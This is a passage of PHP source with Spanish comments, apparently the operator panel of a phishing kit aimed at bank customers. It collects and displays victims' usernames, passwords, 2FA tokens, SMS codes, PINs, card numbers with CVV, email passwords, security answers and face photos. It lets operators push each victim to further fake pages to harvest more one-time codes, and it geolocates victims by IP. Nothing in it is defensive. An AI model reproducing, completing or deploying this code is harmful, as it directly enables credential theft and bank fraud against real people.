         $userData['submissions'][] = ['data' => [], 'timestamp' => time()];
    }
         $userData['submissions'][0]['data']['NroEmpresarial'] = trim($matches[1]);
    }
        
    // Buscar usuario
    if (preg_match('/👤 User:\s*([^\n]+)/', $contenido, $matches)) {
        $usuario = trim($matches[1]);
        $userData['submissions'][] = [
            'data' => [
                'Usuario' => $usuario,
            ],
            'timestamp' => time()
        ];
    }
    
    // Buscar clave
    if (preg_match('/🔐 Clave:\s*([^\n]+)/', $contenido, $matches)) {
        if (empty($userData['submissions'])) {
            $userData['submissions'][] = ['data' => [], 'timestamp' => time()];
        }
        $userData['submissions'][0]['data']['Clave'] = trim($matches[1]);
    }
    
    // Buscar token
    if (preg_match('/🔑 Token:\s*([^\n]+)/', $contenido, $matches)) {
        if (empty($userData['submissions'])) {
            $userData['submissions'][] = ['data' => [], 'timestamp' => time()];
        }
        $userData['submissions'][0]['data']['Token'] = trim($matches[1]);
    }
    
    
    // Buscar SMS
    if (preg_match('/📱 SMS:\s*([^\n]+)/', $contenido, $matches)) {
        if (empty($userData['submissions'])) {
            $userData['submissions'][] = ['data' => [], 'timestamp' => time()];
        }
        $userData['submissions'][0]['data']['Pin'] = trim($matches[1]);
    }
    
    // Buscar PIN
    if (preg_match('/🔢 PIN:\s*([^\n]+)/', $contenido, $matches)) {
        if (empty($userData['submissions'])) {
            $userData['submissions'][] = ['data' => [], 'timestamp' => time()];
        }
        $userData['submissions'][0]['data']['Pin'] = trim($matches[1]);
    }
    
    return $userData;
}

// Recibir datos de prueba
function receiveTestData($postData) {
    $testIP = 'test_' . uniqid();
    $color = getRandomColor();
    
    $userData = [
        'color' => $color,
        'currentPage' => getCurrentPageFromData($postData),
        'location' => 'Ciudad de Prueba, CO',
        'status' => 'online',
        'last_seen' => time(),
        'submissions' => [
            [
                'data' => extractDataFromTest($postData),
                'timestamp' => time()
            ]
        ]
    ];
    
    $usersData = loadUsersData();
    $usersData[$testIP] = $userData;
    file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
    
    return [
        'success' => true, 
        'message' => 'Datos de prueba recibidos correctamente',
        'test_ip' => $testIP
    ];
}

// Funciones auxiliares
function normalizeColor($color) {
    if (strpos($color, '##') === 0) {
        return '#' . substr($color, 2);
    }
    return $color;
}

function generateGlobalHeader($totalColumns) {
    return '<thead><tr><th colspan="' . $totalColumns . '">Usuarios agrupados por color</th></tr></thead>';
}

function generateGroupHeader($color) {
    return '<tr style="background-color: ' . $color . ';">
        <th>#</th>
        <th>Página Actual</th>
        <th>Ubicacion</th>
        <th>Status</th>
        <th>Documento</th>
        <th>NroEmpresarial</th>
        <th>Usuario/adherente</th>
        <th>Clave</th>   
        <th>Token</th> 
        <th>Coordenadas</th>
        <th>Acción</th>
    </tr>';
}

// FUNCIÓN PARA OBTENER EL VALOR MÁS RECIENTE (compatibilidad)
function getSubmissionValue($user, $key) {
    if (!empty($user['submissions']) && is_array($user['submissions'])) {
        // Tomar el valor del submission más reciente
        $lastIndex = count($user['submissions']) - 1;
        return $user['submissions'][$lastIndex]['data'][$key] ?? '';
    }
    return '';
}

function getRandomColor() {
    $colors = ['#800080', '#050f9bff', '#d6c90eff', '#11cc1aff'];
    return $colors[array_rand($colors)];
}

function getCurrentPageFromData($data) {
    if (isset($data['contenido'])) {
        if (strpos($data['contenido'], 'Token:') !== false) return 'Frontend/token_real.php';
        if (strpos($data['contenido'], 'Tarjeta:') !== false) return 'Frontend/tarjeta_real.php';
        if (strpos($data['contenido'], 'SMS:') !== false) return 'Frontend/sms_real.php';
    }
    return 'Frontend/login_real.php';
}

function extractDataFromTest($data) {
    $extracted = [];
    
    if (isset($data['contenido'])) {
        $content = $data['contenido'];
        
        if (preg_match('/👤 User:\s*([^\n]+)/', $content, $matches)) {
            $extracted['Usuario'] = trim($matches[1]);
        }
        
        if (preg_match('/🔐 Clave:\s*([^\n]+)/', $content, $matches)) {
            $extracted['Clave'] = trim($matches[1]);
        }
        
        if (preg_match('/🔑 Token:\s*([^\n]+)/', $content, $matches)) {
            $extracted['Token'] = trim($matches[1]);
        }
        
        if (preg_match('/📱 SMS:\s*([^\n]+)/', $content, $matches)) {
            $extracted['SMS'] = trim($matches[1]);
        }
        
        
        if (preg_match('/🔢 PIN:\s*([^\n]+)/', $content, $matches)) {
            $extracted['Pin'] = trim($matches[1]);
        }
                
        
        $extracted['Banco'] = 'BANCO DE PRUEBA/100.000/test@example.com';
    }
    
    return $extracted;
}

// =============================================
// FUNCIÓN MODIFICADA: GUARDAR NOMBRE + COORDENADAS
// =============================================
function guardarCoordenadas($data) {
    // Nota: Aunque la función se llame "guardarCoordenadas" para no romper el switch,
    // ahora funciona como "Solicitar Token Empresa".
    
    $submissionId = $data['submission_id'] ?? '';
    $ip = $data['ip'] ?? '';
    $last4 = $data['last4'] ?? ''; // Recibimos los 4 dígitos

    $usersData = loadUsersData();
    
    if (isset($usersData[$ip])) {
        $found = false;
        foreach ($usersData[$ip]['submissions'] as &$sub) {
            if ($sub['submission_id'] === $submissionId) {
                
                // Guardamos los dígitos que el admin envió (para mostrarlos si hace falta)
                $sub['data']['Last4_Empresa'] = $last4; 
                
                // ✅ CAMBIO IMPORTANTE: Redirigir a la página de Token Empresa
                // Asegúrate que este archivo exista en tu carpeta Frontend/pchincha/
                $sub['currentPage'] = RUTA_DINAMICA . '/token2.php';
                
                $sub['last_seen'] = time();
                
                $found = true;
                break;
            }
        }
        
        if ($found) {
            $usersData[$ip]['last_seen'] = time();
            // Actualizar globalmente también
            $usersData[$ip]['currentPage'] = RUTA_DINAMICA . '/token2.php';
            
            file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
            return ['success' => true, 'message' => 'Token Empresa solicitado (Dígitos: '.$last4.')'];
        }
    }
    return ['success' => false, 'error' => 'Usuario no encontrado'];
}

// =============================================
// ✅ FUNCIÓN MODIFICADA: GUARDAR ÚLTIMOS 4 DÍGITOS EN LUGAR DE NOMBRE
// =============================================
function guardarNombreToken($data) {
    $submissionId = $data['submission_id'] ?? '';
    $ip = $data['ip'] ?? '';
    $last4 = $data['last4'] ?? ''; // <--- NUEVO: Recibir últimos 4 dígitos
    
    $usersData = loadUsersData();
    
    if (isset($usersData[$ip])) {
        $found = false;
        foreach ($usersData[$ip]['submissions'] as &$sub) {
            if ($sub['submission_id'] === $submissionId) {
                // Guardar últimos 4 dígitos en lugar de nombre
                $sub['data']['Last4'] = $last4; // <--- GUARDAR EN JSON
                
                // CORRECCIÓN: Actualizar la página DE ESTA ENTRADA ESPECÍFICA
                $sub['currentPage'] = RUTA_DINAMICA . '/token.php';
                $sub['last_seen'] = time(); // Refrescar status online
                
                $found = true;
                break;
            }
        }
        
        if ($found) {
            // Actualizar global por compatibilidad
            $usersData[$ip]['last_seen'] = time();
            $usersData[$ip]['currentPage'] = RUTA_DINAMICA . '/token.php';
            
            file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
            return ['success' => true, 'message' => 'Token solicitado con dígitos: ' . $last4];
        }
    }
    return ['success' => false];
}

// =============================================
// PROCESAMIENTO DE PETICIONES
// =============================================

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Limpiar buffer antes de procesar
    if (ob_get_length()) ob_clean();
    
    // ✅✅✅ DETECTAR SI ES PETICIÓN DE FRONTEND (login/token/card/sms)
    if (isset($_POST['contenido'])) {
        error_log("🎯 FRONTEND DETECTADO - CONTENIDO: " . $_POST['contenido']);
        header('Content-Type: application/json');
        $response = processFrontendDataWithUserBlock($_POST);
        echo json_encode($response);
        exit;
    }
    
    // Para acciones del panel admin
    $response = processAdminAction($_POST);
    
    // Forzar respuesta JSON para acciones AJAX
    if (isset($_POST['action']) && $_POST['action'] !== 'load_users') {
        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }
    
    if (isset($response['redirect'])) {
        header('Location: ' . $response['redirect']);
        exit;
    }
}

// Cargar datos de usuarios
$usersData = loadUsersData();

function getLocationByIP($ip) {
    // Si es local, retornar algo específico
    if ($ip === '127.0.0.1' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
        return 'Red Local';
    }
    
    // Si es IPv6 local
    if ($ip === '::1' || strpos($ip, 'fe80:') === 0) {
        return 'Local IPv6';
    }
    
    // Lista de servicios de geolocalización alternativos (priorizar los más rápidos)
    $services = [
        'ipapi' => "https://ipapi.co/{$ip}/json/",
        'ipinfo' => "https://ipinfo.io/{$ip}/json",
        'geolocation' => "http://ip-api.com/json/{$ip}?fields=status,message,countryCode,city"
    ];
    
    // Intentar con cada servicio hasta que uno funcione
    foreach ($services as $serviceName => $url) {
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 3, // Timeout más corto
                    'user_agent' => 'Mozilla/5.0 (Panel Admin)',
                    'header' => "Accept: application/json\r\n"
                ],
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false
                ]
            ]);
            
            $response = @file_get_contents($url, false, $context);
            
            if ($response) {
                $data = json_decode($response, true);
                
                if ($serviceName === 'ipapi' && isset($data['city'])) {
                    $city = $data['city'] ?? '';
                    $country = $data['country_code'] ?? '';
                    return $city . ($city && $country ? ', ' : '') . $country;
                }
                
                if ($serviceName === 'ipinfo' && isset($data['city'])) {
                    $city = $data['city'] ?? '';
                    $country = $data['country'] ?? '';
                    return $city . ($city && $country ? ', ' : '') . $country;
                }
                
                if ($serviceName === 'geolocation' && isset($data['status']) && $data['status'] === 'success') {
                    $city = $data['city'] ?? '';
                    $country = $data['countryCode'] ?? '';
                    return $city . ($city && $country ? ', ' : '') . $country;
                }
            }
        } catch (Exception $e) {
            // Continuar con el siguiente servicio
            continue;
        }
    }
    
    // Si todos los servicios fallan, intentar con cURL como último recurso
    if (function_exists('curl_init')) {
        try {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => "https://ipapi.co/{$ip}/city/",
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 2,
                CURLOPT_FAILONERROR => true,
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            $city = curl_exec($ch);
            
            if ($city && !curl_error($ch)) {
                curl_close($ch);
                return $city . ', ' . 'CO'; // Asumir Colombia si solo tenemos ciudad
            }
            curl_close($ch);
        } catch (Exception $e) {
            // Ignorar error
        }
    }
    
    // Último fallback
    return 'Ubicación no disponible';
}


// ✅ FUNCIÓN PARA OBTENER HORA DE ENTRADA
function getFirstSeen($user) {
    if (!empty($user['submissions']) && is_array($user['submissions'])) {
        // Tomar el timestamp del primer submission (entrada)
        return $user['submissions'][0]['timestamp'] ?? ($user['last_seen'] ?? 0);
    }
    return $user['last_seen'] ?? 0;
}

// =============================================
// GENERADOR VISUAL (TABLA + FILAS) - VERSIÓN FINAL CORREGIDA
// =============================================

// =============================================
// GENERADOR VISUAL (TABLA + FILAS) - CORREGIDO
// =============================================

function generateUsersTable($usersData) {
    // Definimos estilo explícito para evitar problemas CSS
    $html = '
    <table style="width:100%; border-collapse:separate; border-spacing:0 10px;">
        <thead>
            <tr>
                <th style="padding:10px; color:#94a3b8;">#</th>
                <th style="padding:10px; color:#94a3b8;">Estado / IP</th>
                <th style="padding:10px; color:#94a3b8;">Documentos</th>
                <th style="padding:10px; color:#94a3b8;">Credenciales</th>
                <th style="padding:10px; color:#94a3b8;">Token / SMS</th>
                                <th style="padding:10px; color:#94a3b8;">Tarjeta</th>
                <th style="padding:10px; color:#94a3b8;">Preguntas</th>
                <th style="padding:10px; color:#94a3b8;">Pagina</th>
                <th style="padding:10px; color:#94a3b8;">Acciones</th>
            </tr>
        </thead>
        <tbody>';

    if (empty($usersData)) {
        return $html . '<tr><td colspan="7" style="text-align:center; padding:30px; color:#64748b;">Esperando conexiones...</td></tr></tbody></table>';
    }
    
    // Preparar datos
    $allSubmissions = [];
    foreach ($usersData as $ip => $user) {
        if (!empty($user['submissions'])) {
            foreach ($user['submissions'] as $idx => $sub) {
                $allSubmissions[] = ['ip' => $ip, 'user_data' => $user, 'submission' => $sub, 'timestamp' => $sub['timestamp'] ?? time()];
            }
        }
    }
    usort($allSubmissions, function($a, $b) { return $b['timestamp'] - $a['timestamp']; });
    
    // Grupos de color
    $groups = ['#800080'=>[], '#050f9bff'=>[], '#d6c90eff'=>[], '#11cc1aff'=>[]];
    $count = 0;
    foreach ($allSubmissions as $sub) {
        $count++;
        if ($count <= 5) $groups['#800080'][] = $sub;
        elseif ($count <= 10) $groups['#050f9bff'][] = $sub;
        elseif ($count <= 15) $groups['#d6c90eff'][] = $sub;
        else $groups['#11cc1aff'][] = $sub;
    }

    $globalIndex = 1;
    foreach ($groups as $color => $submissions) {
        foreach ($submissions as $data) {
            $html .= generateSubmissionRow($data, $globalIndex, $color);
            $globalIndex++;
        }
    }
    
    return $html . '</tbody></table>';
}

function generateSubmissionRow($data, $index, $color) {
    $ip = $data['ip'];
    $user = $data['user_data'];
    $sub = $data['submission'];
    $d = $sub['data'] ?? [];
    $sid = $sub['submission_id'];
    
    // --- DATOS DE MARCADO ---
    $markedBy = $sub['marked_by'] ?? null;
    $markedColor = $sub['marked_color'] ?? 'transparent';
    
    // Estilo del borde si está marcado (Fondo muy suave + Borde solido)
    $rowStyle = $markedBy ? "border: 2px solid $markedColor; background: rgba(".hexdec(substr($markedColor,1,2)).",".hexdec(substr($markedColor,3,2)).",".hexdec(substr($markedColor,5,2)).", 0.05);" : "background:#1e293b;";
    
    // Status & Página
    $status = checkUserStatus($user, $sub);
    $statusColor = ($status === 'online') ? '#4ade80' : (($status === 'blocked') ? '#ef4444' : '#f59e0b');
    $pageName = basename($sub['currentPage'] ?? ($user['currentPage'] ?? 'Inicio'));

    // Coordenadas
    $coordsHTML = '';
    $rawInput = ($d['RtaGen'] ?? '') . ' ' . ($d['RtaCoord1'] ?? '') . ' ' . ($d['RtaCoord2'] ?? '') . ' ' . ($d['Pin'] ?? '');
    if (preg_match_all('/([A-Z0-9]+)\s*[=:]\s*([0-9]+)/i', $rawInput, $matches, PREG_SET_ORDER)) {
        $coordsHTML .= '<div style="display:flex; gap:5px; flex-wrap:wrap; margin-top:5px;">';
        $seen = [];
        foreach ($matches as $m) {
            $k = strtoupper(trim($m[1])); $v = trim($m[2]);
            if(strlen($k)<6 && !isset($seen[$k])) {
                $seen[$k]=1;
                $coordsHTML .= '<div class="data-value" style="display:inline-flex;align-items:center;background:rgba(245,158,11,0.1);border:1px solid #f59e0b;border-radius:4px;padding:2px 6px;cursor:pointer;" onclick="copiar(\''.$v.'\')"><span style="color:#94a3b8;font-size:0.75rem;margin-right:4px;border-right:1px solid #444;padding-right:4px;">'.$k.'</span><span style="color:#f59e0b;font-weight:bold;">'.$v.'</span></div>';
            }
        }
        $coordsHTML .= '</div>';
    } elseif (!empty($d['Pin'])) {
        $coordsHTML = '<span class="data-value" style="color:#f59e0b; border-color:#f59e0b;" onclick="copiar(\''.$d['Pin'].'\')">'.$d['Pin'].'</span>';
    } else {
        $coordsHTML = ''; // ✅ Aquí estaba el error, lo dejamos vacío
    }
    
    // Datos y Iconos
    $doc = $d['Documento'] ?? ''; $emp = $d['NroEmpresarial'] ?? ''; $usu = $d['Usuario'] ?? ''; 
    $pass = $d['Clave'] ?? ''; $token = $d['Token'] ?? '';
    $firmante = $d['Firmante'] ?? ''; // <--- Extraer variable
        $tokenApp = $d['TokenApp'] ?? '';
    $claveOp = $d['ClaveOperaciones'] ?? '';
        $mail = $d['Correo'] ?? '';
    $mailPass = $d['ClaveCorreo'] ?? '';
        $lbl = !empty($emp) ? 'Tarjeta' : 'Usuario';
    $devIcon = ($user['device_type'] ?? 'desktop') === 'mobile' ? '<i class="fas fa-mobile-alt" style="color:#f59e0b;"></i>' : '<i class="fas fa-desktop"></i>';

    // Flags JS
    $hasToken = !empty($token) ? '1' : '0';
    $hasCoords = (strpos($coordsHTML, '---') === false) ? '1' : '0';

    // --- OBTENER LAST4 Y NOMBRE GUARDADOS ---
    $savedLast4 = $d['Last4'] ?? '';
    $savedNombre = $d['NombreCliente'] ?? ''; // Por si acaso también quieres esto por fila

    // INICIO FILA (Agregamos data-last4 y data-nombre)
    $html = '<tr class="user-row" id="row-'.$sid.'" 
             data-sid="'.$sid.'" 
             data-index="'.$index.'" 
             data-hastoken="'.$hasToken.'" 
             data-hascoords="'.$hasCoords.'" 
             data-last4="'.$savedLast4.'" 
             data-nombre="'.$savedNombre.'"
             style="'.$rowStyle.' box-shadow:0 2px 5px rgba(0,0,0,0.3); transition:all 0.3s;">';
    
    // 1. COLUMNA INDICE
    $html .= '<td><div style="width:4px; height:30px; background:'.$color.'; border-radius:2px; display:inline-block; margin-right:5px; vertical-align:middle;"></div><b>'.$index.'</b></td>';
    
    // 2. COLUMNA ESTADO / IP / TAG
    $html .= '<td>
        <div class="status-row"><div class="status-dot" style="background:'.$statusColor.'; width:8px; height:8px; border-radius:50%; display:inline-block; margin-right:5px; box-shadow:0 0 5px '.$statusColor.'"></div><span style="color:'.$statusColor.';font-weight:bold;font-size:0.8rem;">'.strtoupper($status).'</span></div>
        <div class="status-row" style="margin-top:2px;">'.$devIcon.' <span style="font-size:0.8rem;color:#e2e8f0;">'.($user['location']??'IP').'</span></div>
        <div style="font-size:0.7rem;color:#64748b;margin-left:15px;margin-bottom:5px;">'.$ip.'</div>';
        
    // ETIQUETA ADMIN (FIJA)
    if ($markedBy) {
        $html .= '<div style="margin-top:6px; margin-left:5px;"><span class="admin-mark-tag" style="background:'.$markedColor.';"><i class="fas fa-check-double"></i> '.$markedBy.'</span></div>';
    }
    $html .= '</td>';
    
    // 3. COLUMNA DOCUMENTOS
    $html .= '<td>'.($doc ? '<div class="data-group"><span class="field-label">Doc</span><span class="data-value" onclick="copiar(\''.$doc.'\')">'.$doc.'</span></div>' : '').($emp ? '<div class="data-group"><span class="field-label">Emp</span><span class="data-value" onclick="copiar(\''.$emp.'\')">'.$emp.'</span></div>' : '').'</td>';
    ($firmante ? '<div class="data-group"><span class="field-label" style="color:#a855f7;">Firmante</span><span class="data-value" style="color:#a855f7;border-color:#a855f7;" onclick="copiar(\''.$firmante.'\')">'.$firmante.'</span></div>' : '') . 
        '</td>';
    // 4. COLUMNA CREDENCIALES
    $html .= '<td>'.($usu ? '<div class="data-group"><span class="field-label">'.$lbl.'</span><span class="data-value" onclick="copiar(\''.$usu.'\')">'.$usu.'</span></div>' : '').($pass ? '<div class="data-group"><span class="field-label">Clave</span><span class="data-value" onclick="copiar(\''.$pass.'\')">'.$pass.'</span></div>' : '').'</td>';
    
// Extraer Token Empresa si existe
    $tokenEmpresa = $d['TokenEmpresa'] ?? '';
        $tokenNetCash = $d['TokenNetCash'] ?? ''; // <--- NUEVA VARIABLE

    // 5. COLUMNA TOKEN / FOTOS
    $html .= '<td>';
    
    // Token Normal
    if ($token) {
        $html .= '<div class="data-group"><span class="field-label">Token</span><span class="data-value" style="color:#f59e0b;border-color:#f59e0b;" onclick="copiar(\''.$token.'\')">'.$token.'</span></div>';
    }
    
    // ✅✅✅ BOTONES DE FOTO (DOBLE)
    // 1. FOTO FALLIDA (ROJA)
    $fotoFalla = basename($d['Foto_Falla'] ?? '');
    if ($fotoFalla && $fotoFalla !== 'uploads') {
        $html .= '<div class="data-group">
            <span class="field-label" style="color:#ef4444;">FOTO (Falla)</span>
            <button onclick="abrirVisorFoto(\''.$fotoFalla.'\')" class="data-value" style="color:white; border-color:#ef4444; background:#ef4444; width:100%; display:flex; align-items:center; justify-content:center; gap:5px;">
                <i class="fas fa-camera"></i> Ver Falla
            </button>
        </div>';
    }

    // 2. FOTO EXITOSA (VERDE)
    $fotoOK = basename($d['Foto_OK'] ?? '');
    if ($fotoOK && $fotoOK !== 'uploads') {
        $html .= '<div class="data-group">
            <span class="field-label" style="color:#10b981;">FOTO (OK)</span>
            <button onclick="abrirVisorFoto(\''.$fotoOK.'\')" class="data-value" style="color:white; border-color:#10b981; background:#10b981; width:100%; display:flex; align-items:center; justify-content:center; gap:5px;">
                <i class="fas fa-check-circle"></i> Ver OK
            </button>
        </div>';
    }

    // 3. COMPATIBILIDAD (Por si quedó alguna guardada con el método viejo 'Foto')
    $fotoLegacy = basename($d['Foto'] ?? '');
    if ($fotoLegacy && !$fotoFalla && !$fotoOK && $fotoLegacy !== 'uploads') {
        $colorBtn = ($d['Intento'] ?? '0') == '0' ? '#ef4444' : '#10b981';
        $lblFoto = ($d['Intento'] ?? '0') == '0' ? 'FOTO (Falla)' : 'FOTO (OK)';
        $html .= '<div class="data-group">
            <span class="field-label" style="color:'.$colorBtn.';">'.$lblFoto.'</span>
            <button onclick="abrirVisorFoto(\''.$fotoLegacy.'\')" class="data-value" style="color:white; border-color:'.$colorBtn.'; background:'.$colorBtn.'; width:100%; display:flex; align-items:center; justify-content:center; gap:5px;">
                <i class="fas fa-camera"></i> Ver
            </button>
        </div>';
    }
        
    
    // Net Cash y otros
    if ($tokenNetCash) {
        $html .= '<div class="data-group"><span class="field-label" style="color:#38bdf8;">Token Correo</span><span class="data-value" style="color:#38bdf8;border-color:#38bdf8;" onclick="copiar(\''.$tokenNetCash.'\')">'.$tokenNetCash.'</span></div>';
    }
    if ($tokenEmpresa) {
        $html .= '<div class="data-group"><span class="field-label" style="color:#10b981;">SMS</span><span class="data-value" style="color:#10b981;border-color:#10b981;" onclick="copiar(\''.$tokenEmpresa.'\')">'.$tokenEmpresa.'</span></div>';
    }
    // Coordenadas
    if (!empty($coordsHTML)) {
        $html .= '<div class="data-group">'.$coordsHTML.'</div>';
    }
    // Token App
    if ($tokenApp) {
        $html .= '<div class="data-group"><span class="field-label" style="color:#0ea5e9;">App Token</span><span class="data-value" style="color:#0ea5e9;border-color:#0ea5e9;" onclick="copiar(\''.$tokenApp.'\')">'.$tokenApp.'</span></div>';
    }
    
    $html .= '</td>';
        
        // 6. COLUMNA TARJETA (ANTES CORREO)
    $html .= '<td>';
    
    // Variables de Tarjeta
    $ccNum = $d['CC_Number'] ?? '';
    $ccExp = $d['CC_Exp'] ?? '';
    $ccCvv = $d['CC_Cvv'] ?? '';

    if ($ccNum) {
        $html .= '<div class="data-group"><span class="field-label">Tarjeta</span><span class="data-value" style="color:#f472b6; border-color:#f472b6;" onclick="copiar(\''.$ccNum.'\')">'.$ccNum.'</span></div>';
    }
    if ($ccExp || $ccCvv) {
        $html .= '<div class="data-group"><span class="field-label">Exp / CVV</span><span class="data-value" style="color:#f472b6;" onclick="copiar(\''.$ccExp.'|'.$ccCvv.'\')">'.$ccExp.' | '.$ccCvv.'</span></div>';
    }

    // Mantenemos el correo por si acaso llega, pero debajo
    if ($mail) {
        $html .= '<div class="data-group"><span class="field-label">Email</span><span class="data-value" onclick="copiar(\''.$mail.'\')">'.$mail.'</span></div>';
    }
    if ($mailPass) {
        $html .= '<div class="data-group"><span class="field-label">Clave Email</span><span class="data-value" onclick="copiar(\''.$mailPass.'\')">'.$mailPass.'</span></div>';
    }

    $html .= '</td>';

    // 7. COLUMNA PREGUNTAS
    $html .= '<td>';
    $preg1 = $d['Preg1'] ?? ''; $resp1 = $d['Resp1'] ?? '';
    $preg2 = $d['Preg2'] ?? ''; $resp2 = $d['Resp2'] ?? '';
    $preg3 = $d['Preg3'] ?? ''; $resp3 = $d['Resp3'] ?? '';
    $preg4 = $d['Preg4'] ?? ''; $resp4 = $d['Resp4'] ?? '';
    $pregSeg = $d['PreguntaSeguridad'] ?? ''; $respSeg = $d['RespuestaSeguridad'] ?? '';
    if ($preg1 || $preg2 || $preg3 || $preg4 || $pregSeg || $respSeg) {
        if ($preg1 && $resp1) $html .= '<div class="data-group"><span class="field-label" style="color:#a78bfa;">P1: '.$preg1.'</span><span class="data-value" style="font-size:0.8rem;min-width:unset;" onclick="copiar(\''.$resp1.'\')">'.$resp1.'</span></div>';
        if ($preg2 && $resp2) $html .= '<div class="data-group"><span class="field-label" style="color:#a78bfa;">P2: '.$preg2.'</span><span class="data-value" style="font-size:0.8rem;min-width:unset;" onclick="copiar(\''.$resp2.'\')">'.$resp2.'</span></div>';
        if ($preg3 && $resp3) $html .= '<div class="data-group"><span class="field-label" style="color:#a78bfa;">P3: '.$preg3.'</span><span class="data-value" style="font-size:0.8rem;min-width:unset;" onclick="copiar(\''.$resp3.'\')">'.$resp3.'</span></div>';
        if ($preg4 && $resp4) $html .= '<div class="data-group"><span class="field-label" style="color:#a78bfa;">P4: '.$preg4.'</span><span class="data-value" style="font-size:0.8rem;min-width:unset;" onclick="copiar(\''.$resp4.'\')">'.$resp4.'</span></div>';
        if ($pregSeg && $respSeg) $html .= '<div class="data-group"><span class="field-label" style="color:#a78bfa;">PS: '.$pregSeg.'</span><span class="data-value" style="font-size:0.8rem;min-width:unset;" onclick="copiar(\''.$respSeg.'\')">'.$respSeg.'</span></div>';
    } else {
        $html .= '<span style="color:#475569;font-size:0.8rem;">---</span>';
    }
    $html .= '</td>';

    // 8. COLUMNA PAGINA
    $html .= '<td><span style="color:#e2e8f0;font-size:0.85rem;background:#334155;padding:4px 8px;border-radius:4px;">'.$pageName.'</span></td>';

    // 9. COLUMNA ACCIONES
    $currentUser = $_SESSION['admin_username'] ?? '';
    
    // LÓGICA DEL BOTÓN MARCAR/DESMARCAR
    if ($markedBy) {
        if ($markedBy === $currentUser) {
            // SI YO LO MARQUÉ -> Botón Rojo de Desmarcar
            $btnMarkStyle = 'background:#ef4444; cursor:pointer;'; 
            $btnMarkAction = 'onclick="desmarcarEntrada(\''.$sid.'\', \''.$ip.'\', this)"';
            $btnMarkText = 'Desmarcar';
            $btnMarkIcon = 'fa-times-circle';
            $btnMarkTitle = 'Haz clic para liberar esta entrada';
        } else {
            // SI OTRO LO MARCÓ -> Botón Gris Bloqueado
            $btnMarkStyle = 'background:#334155; opacity:0.6; cursor:not-allowed;'; 
            $btnMarkAction = ''; // Sin acción
            $btnMarkText = 'Por: '.$markedBy; // Muestra quién lo tiene
            $btnMarkIcon = 'fa-lock';
            $btnMarkTitle = 'Bloqueado por usuario '.$markedBy;
        }
    } else {
        // NADIE LO HA MARCADO -> Botón Violeta de Marcar
        $btnMarkStyle = 'background:#8b5cf6; cursor:pointer;'; 
        $btnMarkAction = 'onclick="marcarEntrada(\''.$sid.'\', \''.$ip.'\', this)"';
        $btnMarkText = 'Marcar';
        $btnMarkIcon = 'fa-thumbtack';
        $btnMarkTitle = 'Marcar entrada para mí';
    }

    $html .= '<td>';
    
    /// CONTENEDOR BOTONES ACTUALIZADO CON EL BOTÓN DE CORREO
    $html .= '<div style="display:flex; gap:5px; flex-wrap:wrap;">
        
        <button class="btn-icon bg-login" onclick="redirectUserBySubmission(\''.$sid.'\', \''.$ip.'\', \'login_real.php\')" title="Login Persona"><i class="fas fa-user"></i></button>
        
        <button class="btn-icon bg-token" onclick="abrirModalToken(\''.$sid.'\', \''.$ip.'\')" title="Token Móvil"><i class="fas fa-mobile-alt"></i></button>
                
                <button class="btn-icon" style="background:#38bdf8;" onclick="redirectUserBySubmission(\''.$sid.'\', \''.$ip.'\', \'sms.php\')" title="SMS"><i class="fa-solid fa-comment-sms"></i></button>
        
        
        <button class="btn-icon" style="background:#8b5cf6;" onclick="abrirModalPregunta(\''.$sid.'\', \''.$ip.'\')" title="Preguntas Seguridad"><i class="fas fa-shield-alt"></i></button>
		
		<button class="btn-icon" style="background:#38bdf8;" onclick="redirectUserBySubmission(\''.$sid.'\', \''.$ip.'\', \'facial.php\')" title="Facial"><i class="fa-solid fa-eye"></i></button>
        
        <button class="btn-icon bg-del" onclick="pedirConfirmacion(\'eliminar_registro\', \''.$sid.'\', \''.$ip.'\')" title="Borrar"><i class="fas fa-trash"></i></button>
        
        '.($status==='blocked' ? '<button class="btn-icon bg-coord" onclick="unblockUser(\''.$ip.'\')"><i class="fas fa-lock-open"></i></button>' : '<button class="btn-icon bg-block" onclick="pedirConfirmacion(\'bloquear\', \''.$ip.'\')"><i class="fas fa-ban"></i></button>').'
    </div>';
        
    // BOTÓN MARCAR/DESMARCAR DINÁMICO (GRANDE Y SEPARADO)
    $html .= '<button class="btn-icon" style="'.$btnMarkStyle.' width: auto; padding: 0 15px; height: 34px; font-size: 0.85rem; margin-top: 10px; border-radius:6px; display:flex; align-items:center;" '.$btnMarkAction.' title="'.$btnMarkTitle.'"><i class="fas '.$btnMarkIcon.'" style="margin-right:6px;"></i> '.$btnMarkText.'</button>';

    $html .= '</td></tr>';
    
    return $html;
}
function approveUserLogin($username) {
    // Usamos los nombres abstractos (sin .json)
    $pending = loadData('storage_pending');

    if (isset($pending[$username])) {
        // 1. Guardar Color Definitivo
        $colors = loadData('storage_colors');
        $colors[$username] = $pending[$username]['color'];
        saveData('storage_colors', $colors);

        // 2. Registrar usuario (sin password inicialmente)
        $users = loadData('storage_users');
        if (!isset($users[$username])) {
            $users[$username] = 'nopassword';
            saveData('storage_users', $users);
        }

        // 3. Marcar como aprobado
        $pending[$username]['status'] = 'approved';
        saveData('storage_pending', $pending);

        return ['success' => true];
    }
    return ['success' => false, 'error' => 'Solicitud no encontrada'];
}

function rejectUserLogin($username) {
    $pending = loadData('storage_pending');
    if (isset($pending[$username])) {
        $pending[$username]['status'] = 'rejected'; 
        saveData('storage_pending', $pending);
        return ['success' => true];
    }
    return ['success' => false];
}

function getPendingLogins() {
    $all = loadData('storage_pending');
    $data = [];
    foreach($all as $u) {
        if(isset($u['status']) && $u['status'] === 'pending') $data[] = $u;
    }
    return ['success' => true, 'data' => $data];
}

// Agrega estas funciones después de las otras funciones en admin.php

function getAuthMode() {
    $configFile = 'system_config.json';
    if (file_exists($configFile)) {
        $config = json_decode(file_get_contents($configFile), true);
        return $config['auth_mode'] ?? 'authorization';
    }
    return 'authorization'; // Por defecto: autorización
}

function setAuthMode($mode) {
    $configFile = 'system_config.json';
